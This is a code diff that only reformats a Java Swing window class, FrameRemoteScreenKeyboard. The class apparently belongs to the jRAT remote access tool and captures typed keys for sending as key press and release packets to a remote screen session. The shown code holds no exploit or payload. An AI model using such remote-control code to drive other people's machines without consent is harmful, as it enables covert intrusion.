@@ -22,13 +22,12 @@ import javax.swing.border.EmptyBorder;
 import pro.jrat.packets.outgoing.Packet94KeyPress;
 import pro.jrat.packets.outgoing.Packet95KeyRelease;
 
-
 @SuppressWarnings("serial")
 public class FrameRemoteScreenKeyboard extends BaseFrame {
 
 	private JPanel contentPane;
 	private FrameRemoteScreen frame;
-	
+
 	public static HashMap<FrameRemoteScreen, FrameRemoteScreenKeyboard> instances = new HashMap<FrameRemoteScreen, FrameRemoteScreenKeyboard>();
 	private JTextPane txt;
 	private JToggleButton button;
@@ -51,32 +50,26 @@ public class FrameRemoteScreenKeyboard extends BaseFrame {
 		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
 		contentPane.setLayout(new BorderLayout(0, 0));
 		setContentPane(contentPane);
-		
+
 		JScrollPane panel = new JScrollPane();
 		panel.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_ALWAYS);
 		panel.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
 		contentPane.add(panel, BorderLayout.CENTER);
-		
+
 		txt = new JTextPane();
 		panel.setViewportView(txt);
-		
+
 		JPanel panel_1 = new JPanel();
 		contentPane.add(panel_1, BorderLayout.SOUTH);
-		
+
 		button = new JToggleButton("Listen for input");
 		button.setSelected(true);
 		button.setIcon(new ImageIcon(FrameRemoteScreenKeyboard.class.getResource("/icons/keyboard_arrow.png")));
 		GroupLayout gl_panel_1 = new GroupLayout(panel_1);
-		gl_panel_1.setHorizontalGroup(
-			gl_panel_1.createParallelGroup(Alignment.LEADING)
-				.addComponent(button, GroupLayout.DEFAULT_SIZE, 424, Short.MAX_VALUE)
-		);
-		gl_panel_1.setVerticalGroup(
-			gl_panel_1.createParallelGroup(Alignment.LEADING)
-				.addComponent(button, GroupLayout.DEFAULT_SIZE, 34, Short.MAX_VALUE)
-		);
+		gl_panel_1.setHorizontalGroup(gl_panel_1.createParallelGroup(Alignment.LEADING).addComponent(button, GroupLayout.DEFAULT_SIZE, 424, Short.MAX_VALUE));
+		gl_panel_1.setVerticalGroup(gl_panel_1.createParallelGroup(Alignment.LEADING).addComponent(button, GroupLayout.DEFAULT_SIZE, 34, Short.MAX_VALUE));
 		panel_1.setLayout(gl_panel_1);
-		
+
 		txt.addKeyListener(new KeyAdapter() {
 			@Override
 			public void keyPressed(KeyEvent arg0) {
@@ -93,8 +86,7 @@ public class FrameRemoteScreenKeyboard extends BaseFrame {
 			}
 		});
 	}
-	
-	
+
 	public void exit() {
 		instances.remove(frame);
 	}
